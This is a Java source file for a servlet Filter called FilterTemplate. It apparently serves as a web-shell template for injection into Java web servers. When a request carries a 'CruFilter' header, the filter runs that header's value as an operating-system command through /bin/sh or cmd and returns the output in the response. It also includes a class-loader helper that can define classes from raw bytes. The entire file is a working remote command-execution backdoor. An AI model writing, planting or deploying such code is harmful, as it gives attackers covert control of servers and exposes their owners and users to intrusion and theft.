import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Scanner;

public class FilterTemplate implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("[+] Dynamic Filter says hello");
        String cmd = ((HttpServletRequest)servletRequest).getHeader("CruFilter");
        if(cmd != null ){
            //basic cmd shell
            String[] cmds = null;
            if(File.separator.equals("/")){
                cmds = new String[]{"/bin/sh", "-c", cmd};
            }else{
                cmds = new String[]{"cmd", "/C", cmd};
            }
            String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
            servletResponse.getWriter().println(result);

        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }

    class U extends ClassLoader{
        U(ClassLoader c){super(c);}

        public Class g(byte []b){return super.defineClass(b,0,b.length);}
    }
}
